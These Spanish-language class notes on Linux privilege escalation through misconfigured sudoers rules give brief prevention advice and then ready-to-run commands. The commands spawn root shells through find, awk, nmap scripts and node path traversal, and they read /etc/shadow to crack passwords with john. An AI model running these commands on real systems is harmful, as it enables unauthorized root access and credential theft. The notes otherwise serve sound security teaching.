# Abusando de privilegios a nivel de Sudoers

Tags: #Linux #Sudoers #Escalada #Root #Privilegios 

El archivo **/etc/sudoers** es un archivo de configuración en sistemas Linux que se utiliza para controlar el acceso de los usuarios a las diferentes acciones que pueden realizar en el sistema. Este archivo contiene una lista de usuarios y grupos de usuarios que tienen permisos para realizar tareas de administración en el sistema.

El comando “**sudo**” permite a los usuarios ejecutar comandos como superusuario o como otro usuario con privilegios especiales. El archivo sudoers especifica qué usuarios pueden ejecutar qué comandos con sudo y con qué privilegios.

Abusar de los privilegios a nivel de sudoers es una técnica utilizada por los atacantes para elevar su nivel de acceso en un sistema comprometido. Si un atacante es capaz de obtener acceso a una cuenta con permisos de sudo en el archivo sudoers, puede ejecutar comandos con privilegios especiales y realizar acciones maliciosas en el sistema.

El comando “**sudo -l**” es utilizado para listar los permisos de sudo de un usuario en particular. Al ejecutar este comando, se muestra una lista de los comandos que el usuario tiene permiso para ejecutar y bajo qué condiciones.

Para prevenir el abuso de privilegios a nivel de sudoers, se recomienda mantener los permisos adecuados en el archivo sudoers y limitar el número de usuarios con permisos de sudo. Además, es importante monitorear regularmente el archivo sudoers y buscar cambios inesperados o sospechosos en su contenido.

A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta clase para detectar comandos que potencialmente puedan ser explotados para elevar nuestro privilegio de usuario:

- **GTFOBins**: [https://gtfobins.github.io/](https://gtfobins.github.io/)

## Sudoers 

```bash
❯ sudo -l    # Ejecutar el comando 'find' sin password
	
	# (ALL : ALL) ALL
	# ALL=(root) NOPASSWD: /usr/bin/find
	
# Ejecutar el comando de la siguiente manera:
❯ sudo find . -exec /bin/sh \; -quit
❯ sudo awk 'BEGIN {system("/bin/sh")}' 
```

```bash
❯ sudo -l      # Ejecutar el comando 'nmap' siendo 'user2' sin passwd
	
	#  (user2) NOPASSWD: /usr/bin/nmap 

# Ejecutar el comando de la siguiente manera:
❯ echo 'os.execute("/bin/sh")' > script.nse     # Ejecutar el comando en el dir '/tmp/'
❯ sudo -u user2 nmap --script=/tmp/script.nse
```

```bash 
❯ sudo -l       # Cambiar de usuario sin password 

	#  (user1 : user2) NOPASSWD: /bin/bash 

# Ejecutar el comando de la siguiente manera:
❯ sudo -u user2 /bin/bash     
```

```bash 
❯ sudo -l       # Ejecutar el comando 'cat' sin password 

	#  (root) NOPASSWD: /bin/cat  

# Ejecutar el comando en la maquina vítima de la siguiente manera:
❯ sudo cat /etc/passwd        # Mirar el contenido para copiarlo a Kali en un archivo llamado 'passwd'
❯ sudo cat /etc/shadow        # Mirar el contenido para copiarlo a Kali en un archivo llamado 'shadow'

# En Kali 
❯ unshadow passwd shadow > pwd.txt  
❯ john pwd.txt -w=/usr/share/wordlists/john.lst   # Obtener la password del usuario 'root'
```

```bash 
❯ sudo -l       # Ejecutar el comando 'node' sin password pero obligado a una ruta 

	# (ALL) /usr/bin/node /usr/local/scripts/*.js   


# Ejecutar el comando en la maquina vítima de la siguiente manera:
❯ sudo /usr/bin/node /usr/local/scripts/../../../../tmp/esc.js   


# Se debe crear un archivo llamado 'esc.js' en la carpeta /tmp y tendrá lo siguiente:
	require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```